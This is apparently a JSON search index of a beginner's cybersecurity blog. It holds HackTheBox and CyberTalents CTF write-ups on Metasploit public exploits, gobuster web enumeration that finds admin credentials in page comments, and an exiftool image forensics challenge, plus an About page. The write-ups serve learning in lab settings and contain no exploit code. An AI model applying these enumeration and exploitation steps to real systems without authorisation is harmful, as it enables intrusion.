will work against our target. With all the options set, we verified the details and executed the payload on the target.\nSolution/Flag # Upon successful execution of the payload, the Metasploit console provided us with the following output:\n[+] File saved in: /home/papab3ar/.msf4/loot/20230803014901_default_94.237.49.11_simplebackup.tra_422018.txt [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Using the command cat, we accessed the directory where the file was saved and retrieved the contents of the flag, thus completing the challenge. Conclusion # Metasploit proved to be a powerful tool during this challenge, allowing us to search for and exploit publicly available vulnerabilities effortlessly. It demonstrates the significance of staying vigilant against potential threats and the importance of secure coding practices for developers.\nFor a deeper understanding of Metasploit and its capabilities, you can refer to its official documentation here\nIn conclusion, this challenge provided an excellent opportunity to apply web enumeration techniques, uncover hidden information, and identify potential vulnerabilities. As hackers, the quest for knowledge and continuous learning is paramount. Happy hacking, and never stop learning!\n","date":"2 August 2023","externalUrl":null,"permalink":"/posts/2023-08-02-public-exploits/2023-08-02-public-exploits/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eWelcome to yet another writeup where I cover an important tool used by hackers to exploit vulnerabilities on different systems: \u003ca\n  href=\"https://www.metasploit.com/\"\n    target=\"_blank\"\n  \u003eMetasploit\u003c/a\u003e In this challenge, part of the \u0026ldquo;Getting started\u0026rdquo; series on HackTheBox Academy, we will be delving into the realm of public exploits and uncovering the power of Metasploit.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\u003c/em\u003e\u003c/p\u003e","title":"Public Exploits","type":"posts"},{"content":"","date":"2 August 2023","externalUrl":null,"permalink":"/categories/wordpress/","section":"Categories","summary":"","title":"Wordpress","type":"categories"},{"content":"","date":"2 August 2023","externalUrl":null,"permalink":"/tags/wordpress/","section":"Tags","summary":"","title":"Wordpress","type":"tags"},{"content":" Introduction # Welcome to another writeup from a challenge discovered at one of the best learning platforms for hackers HackTheBox. This challenge is part of the Getting Started module and can be found here. It is an excellent starting point for those interested in offensive security or red teaming.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nWeb Enumeration Challenge. # The challenge instructions were straightforward: \u0026ldquo;Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.\u0026rdquo; The focus of the challenge was to apply web enumeration techniques to assess the security of websites. By copying the target IP address and visiting the associated webpage, We are greeted with some welcome text to the \u0026ldquo;HTB blog page\u0026rdquo;. Observations \u0026amp; Findings # Upon first inspection, there wasn\u0026rsquo;t much information visible on the webpage. My next step was to inspect the page\u0026rsquo;s underlying code, which is often a good starting point for such challenges. Unfortunately, even after inspecting the code, I didn\u0026rsquo;t find anything substantial. So, I decided to leverage the tool gobuster to perform a brute-force attack on the website and find other directories.\nThis approach paid off as I discovered a directory. Navigating this directory revealed a page that appeared to be under construction, possibly an incomplete WordPress site. Once again, I decided to inspect the page\u0026rsquo;s code, hoping to find something useful. This time, I stumbled upon a section related to web crawlers. Web crawlers, also known as spiders or spiderbots, systematically browse the World Wide Web on behalf of search engines for indexing purposes. Websites often use a file called robots.txt to instruct or block these crawlers from accessing certain web directories. Armed with this knowledge, I attempted to access the robots.txt file to view its contents. Once again, I inspected the code of this page and came across some interesting comments. It seemed that the web developer forgot to remove the comments containing login credentials for the admin user. Page code inspection follows: Solution/Flag # Using the credentials found in the comments, I successfully logged in as an admin user, which led me to a new page containing the flag for the challenge.\nConclusion # In conclusion, this challenge provided a great opportunity to apply web enumeration techniques to uncover hidden information and identify potential vulnerabilities. The process involved inspecting the underlying code, using gobuster for directory enumeration, understanding the significance of robots.txt files, and recognizing the importance of secure coding practices.\nAs a hacker, it\u0026rsquo;s crucial to continuously explore and learn new techniques. Happy hacking, and never stop learning!\n","date":"29 July 2023","externalUrl":null,"permalink":"/posts/2023-07-29-web-enumeration/2023-07-29-web-enumeration/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eWelcome to another writeup from a challenge discovered at one of the best learning platforms for hackers \u003ca\n  href=\"https://academy.hackthebox.com/\"\n    target=\"_blank\"\n  \u003eHackTheBox\u003c/a\u003e. This challenge is part of the \u003cstrong\u003eGetting Started\u003c/strong\u003e module and can be found \u003ca\n  href=\"https://academy.hackthebox.com/course/preview/getting-started\"\n    target=\"_blank\"\n  \u003ehere\u003c/a\u003e.  It is an excellent starting point for those interested in offensive security or red teaming.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\u003c/em\u003e\u003c/p\u003e","title":"Web Enumeration","type":"posts"},{"content":"","date":"29 July 2023","externalUrl":null,"permalink":"/categories/web-security/","section":"Categories","summary":"","title":"Web Security","type":"categories"},{"content":"","date":"29 July 2023","externalUrl":null,"permalink":"/tags/web-security/","section":"Tags","summary":"","title":"Web Security","type":"tags"},{"content":" Welcome to my cybersecurity journey Welcome to HushKat\u0026rsquo;s Cyber Den - Where curiosity meets cybersecurity, and every challenge is an opportunity to learn! Introduction # Hello, fellow cybersecurity enthusiasts! Welcome to my digital sanctuary, where I share my experiences, challenges, and triumphs as I embark on a thrilling adventure into the world of Capture The Flag (CTF) competitions and cybersecurity. This blog chronicles my journey from curious beginner to passionate practitioner, diving headfirst into the captivating realm of ethical hacking and digital forensics.\nAbout Me # Let me start by introducing myself. I am HushKat, a passionate individual with an insatiable curiosity for all things cybersecurity. While I started as a newcomer to CTFs and the broader field of cybersecurity, my journey has been one of continuous learning and growth. I believe that by documenting my experiences through this blog, I can not only track my progress but also provide valuable insights to fellow learners and inspire others to join this exciting path.\nMy Philosophy: Every expert was once a beginner. Every pro was once an amateur. Every icon was once an unknown. What You\u0026rsquo;ll Find Here # This blog serves as a comprehensive resource covering various aspects of cybersecurity:\n🚩 CTF Writeups # Detailed walkthroughs of Capture The Flag challenges across multiple categories:\nDigital Forensics - Uncovering hidden secrets in data Web Security - Exploiting and securing web applications Cryptography - Breaking codes and ciphers Reverse Engineering - Understanding how things work Binary Exploitation - Finding and exploiting vulnerabilities Network Security - Analyzing network traffic and protocols 🛠️ Tools \u0026amp; Techniques # Reviews, tutorials, and guides on essential cybersecurity tools:\nPenetration testing frameworks Digital forensics utilities Network analysis tools Custom scripts and automation 📚 Learning Resources # Curated collections of resources for aspiring security professionals:\nBeginner-friendly tutorials Advanced training materials Community recommendations Career guidance 🎯 Real-World Applications # Bridging the gap between CTF challenges and real-world security:\nVulnerability assessments Incident response scenarios Security best practices Industry insights My Journey So Far # Starting as a complete beginner, I\u0026rsquo;ve participated in numerous CTF competitions, tackled hundreds of challenges, and continuously expanded my knowledge base. Each challenge has taught me something new, and every failure has been a stepping stone to success.\nKey Milestones # First CTF: The moment that sparked my passion Tool Mastery: Learning to wield various security tools effectively Community Engagement: Contributing to the cybersecurity community Knowledge Sharing: Helping others through detailed writeups Acknowledging Growth and Learning # Important Note: I believe in transparent learning. This blog documents my journey, including mistakes, learning curves, and evolving understanding. What you see here is authentic growth in action. I embrace the fact that cybersecurity is a field of continuous learning. Technology evolves, new vulnerabilities emerge, and attack techniques constantly change. Rather than claiming expertise, I focus on:\nDocumenting learning processes - Showing how I approach problems Sharing discoveries - Highlighting interesting findings and techniques Building understanding - Breaking down complex concepts Growing together - Learning alongside the community Join the Adventure # Whether you\u0026rsquo;re a seasoned cybersecurity professional, a fellow learner, or someone simply curious about the digital security landscape, I invite you to join this journey. Together, we can:\nExplore fascinating CTF challenges and real-world scenarios Share knowledge, techniques, and discoveries Build a supportive community of learners Grow our cybersecurity skills and understanding Ways to Connect # Read and Learn - Dive into detailed writeups and tutorials Engage - Comment on posts and share your insights Follow - Stay updated with the latest posts and discoveries Contribute - Share your own experiences and knowledge Looking Forward # The cybersecurity landscape is vast and ever-changing. This blog will continue to evolve as I explore new areas, tackle different challenges, and deepen my understanding. Expect to find:\nRegular CTF writeups from various competitions Tool reviews and tutorials for practical applications Learning insights from hands-on experiences Community highlights featuring interesting discoveries Career reflections on growth in cybersecurity Let\u0026rsquo;s Begin! # Welcome to HushKat\u0026rsquo;s Cyber Den! Together, let\u0026rsquo;s embark on an exhilarating exploration of cybersecurity, where we\u0026rsquo;ll tackle challenges, unravel digital mysteries, and celebrate every step of progress. My dedication and enthusiasm drive me forward, and I hope you\u0026rsquo;ll find inspiration, knowledge, and perhaps a few surprises along the way.\nReady to dive in? Check out my latest blog posts or explore challenges by category! Disclaimer: The content presented in this blog is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity. Always ensure you have proper authorization before testing security techniques. ","date":"21 June 2023","externalUrl":null,"permalink":"/about/","section":"Welcome to HushKat's Cyber Den","summary":"\u003cp\u003e\n\n\n\n\n\n\n\u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" alt=\"Welcome to HushKat\u0026rsquo;s Cyber Den\" src=\"/about/img/cover.webp\"\u003e\n\n  \n    \u003cfigcaption\u003eWelcome to my cybersecurity journey\u003c/figcaption\u003e\n\u003c/figure\u003e\n\n\n  \n\n\n\n\u003cdiv\n  \n    class=\"flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900\"\n  \n  \u003e\n  \u003cspan\n    \n      class=\"text-primary-400 pe-3 flex items-center\"\n    \n    \u003e\n    \u003cspan class=\"relative block icon\"\u003e\u003csvg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\"\u003e\u003cpath fill=\"currentColor\" d=\"M256 0C114.6 0 0 114.6 0 256s114.6 256 256 256s256-114.6 256-256S397.4 0 256 0zM256 128c17.67 0 32 14.33 32 32c0 17.67-14.33 32-32 32S224 177.7 224 160C224 142.3 238.3 128 256 128zM296 384h-80C202.8 384 192 373.3 192 360s10.75-24 24-24h16v-64H224c-13.25 0-24-10.75-24-24S210.8 224 224 224h32c13.25 0 24 10.75 24 24v88h16c13.25 0 24 10.75 24 24S309.3 384 296 384z\"/\u003e\u003c/svg\u003e\n\u003c/span\u003e\n  \u003c/span\u003e\n\n  \u003cspan\n    \n      class=\"dark:text-neutral-300\"\n    \n    \u003e\u003cstrong\u003eWelcome to HushKat\u0026rsquo;s Cyber Den\u003c/strong\u003e - Where curiosity meets cybersecurity, and every challenge is an opportunity to learn!\u003c/span\u003e\n\u003c/div\u003e\n\u003c/p\u003e","title":"About","type":"page"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/categories/cybertalents/","section":"Categories","summary":"","title":"CyberTalents","type":"categories"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/tags/cybertalents/","section":"Tags","summary":"","title":"CyberTalents","type":"tags"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/categories/diff/","section":"Categories","summary":"","title":"Diff","type":"categories"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/tags/diff/","section":"Tags","summary":"","title":"Diff","type":"tags"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/categories/digital-forensics/","section":"Categories","summary":"","title":"Digital Forensics","type":"categories"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/tags/digital-forensics/","section":"Tags","summary":"","title":"Digital Forensics","type":"tags"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/categories/exiftool/","section":"Categories","summary":"","title":"Exiftool","type":"categories"},{"content":"","date":"21 June 2023","externalUrl":null,"permalink":"/tags/exiftool/","section":"Tags","summary":"","title":"Exiftool","type":"tags"},{"content":" Introduction # Welcome to another exciting journey into the world of Cybersec and its mysteries! In this blog post, we\u0026rsquo;ll explore a captivating gamified challenge in the field of Digital Forensics. Join me as we dive into the intriguing world of Capture The Flag and unravel the secrets behind the challenge titled \u0026lsquo;Keep it Simple.\u0026rsquo; This challenge is part of the Introduction to Cybersecurity (Online) series that I have been looking into over the past few days and can be found here.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nUnveiling the Enigma: Keep it Simple Challenge. # The challenge description had the string: The answer is simple(as you will see, it truly is simple). The more one can gather from here is that it\u0026rsquo;s a Digital Forensics challenge titled: Keep it simple Upon clicking the green \u0026ldquo;Start Challenge\u0026rdquo; button, I was presented with a link to a webpage that looks like this:\nObservations \u0026amp; Findings # As usual, the first thing I always try to do with these challenges, is to inspect the page where its hosted for hints or clues on how to proceed with an attempt. The trick is to be as keen as you can when doing this so as not to miss on any breadcrumbs :D. At first glance, the webpage source code looks normal but on taking a closer look you notice a reference to two images with only one being embedded on the webpage. My curiosity kicked in:\nSo I downloaded both the images, to get a closer look and see if there is something out of the ordinary about them. The first image that was embedded on the webpage I saved as is, that is the_eye.jpeg and image two (hidden hint in source code) saved as the_eye0.jpeg. Again at first glance, everything about this images looks the same, from file size, dimensions of the image and most obviously their outlook. So we have to use the eye of a thief, to see what others dont. Here is a glimpse of both the images:\nNext, I decide to compare the images using diff command from the terminal to compare if the images are actually the same or not. Here is the output from the comparison:\nWe are seeing here that the two files actually differ, which makes me more curious and I therefore decide to look at the images metadata using the exiftool and here out attention is drawn to the difference of the two images that we normally wouldnt have seen from just looking at the pictures.\nI try as much as I can to link additional information on new terms and tools used in the blog check them out to learn more.\nSolution/Flag # To look at the metadata of both the images we type the command exiftool followed by the filename. See the image below for output comparison.\n.\nKudos!! We now captured the flag.I have obfuscated the flag to keep the integrity of the challenge.\nConclusion # In conclusion, this challenge reminds us that sometimes the answers are simple and can be found in plain sight. By honing our observation skills and utilizing powerful tools like diff and exiftool, we can uncover hidden secrets. Remember, even in the world of cybersecurity, simplicity can hold the key to success. Keep exploring, keep hacking, and never stop learning! Happy Hacking.\n","date":"21 June 2023","externalUrl":null,"permalink":"/posts/2023-06-21-keep-it-simple/2023-06-21-keep-it-simple/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eWelcome to another exciting journey into the world of Cybersec and its mysteries! In this blog post, we\u0026rsquo;ll explore a captivating gamified challenge in the field of Digital Forensics. Join me as we dive into the intriguing world of \u003ca\n  href=\"https://en.wikipedia.org/wiki/Capture_the_flag_%28cybersecurity%29\"\n    target=\"_blank\"\n  \u003eCapture The Flag\u003c/a\u003e and unravel the secrets behind the challenge titled \u0026lsquo;Keep it Simple.\u0026rsquo; This challenge is part of the \u003cstrong\u003eIntroduction to Cybersecurity (Online)\u003c/strong\u003e series that I have been looking into over the past few days and can be found \u003ca\n  href=\"https://cybertalents.com/challenges/forensics/keep-it-simple\"\n    target=\"_blank\"\n  \u003ehere\u003c/a\u003e.\u003c/p\u003e","title":"Keep it Simple","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]